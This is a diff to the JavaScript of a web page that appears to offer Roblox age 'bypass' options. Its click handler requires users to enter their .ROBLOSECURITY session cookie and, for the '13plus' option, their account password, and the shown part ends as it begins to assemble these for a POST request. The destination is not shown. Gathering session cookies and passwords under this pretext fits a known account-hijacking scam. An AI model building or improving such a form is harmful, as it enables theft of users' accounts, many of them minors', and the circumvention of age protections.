@@ -348,43 +348,37 @@ bypassSelect.addEventListener('change', () => {
 });
 
 
-processBtn.addEventListener('click', async () => {
-  clearMessages();
 
-  const option = bypassSelect.value;
-  if (!option) {
-    showError('Please select a bypass option.');
-    return;
-  }
+    processBtn.addEventListener('click', async () => {
+      clearMessages();
 
-  const cookie = cookieInput.value.trim();
-  if (!cookie) {
-    showError('Please enter your .ROBLOSECURITY cookie.');
-    return;
-  }
+      const option = bypassSelect.value;
+      if (!option) {
+        showError('Please select a bypass option.');
+        return;
+      }
 
-  let password = '';
-  // Bei beiden Optionen Geburtstagsprüfung hinzufügen
-  if (option === 'birthyear' || option === '13plus') {
-    if (!birthDay.value || !birthMonth.value || !birthYear.value) {
-      showError('Please select your birthdate.');
-      return;
-    }
-  }
+      const cookie = cookieInput.value.trim();
+      if (!cookie) {
+        showError('Please enter your .ROBLOSECURITY cookie.');
+        return;
+      }
 
-  if (option === '13plus') {
-    password = passwordInput.value.trim();
-    if (!password) {
-      showError('Please enter your password for 13+ bypass.');
-      return;
-    }
-  }
+      let password = '';
+      if (option === '13plus') {
+        password = passwordInput.value.trim();
+        if (!password) {
+          showError('Please enter your password for 13+ bypass.');
+          return;
+        }
+        // Validate birthdate selection
+        if (!birthDay.value || !birthMonth.value || !birthYear.value) {
+          showError('Please select your birthdate.');
+          return;
+        }
+      }
 
-  loaderOverlay.style.display = 'flex';
-
-  // Rest deines Codes bleibt unverändert...
-  // ...
-});
+      loaderOverlay.style.display = 'flex';
 
       // Prepare data for POST
       let data = {
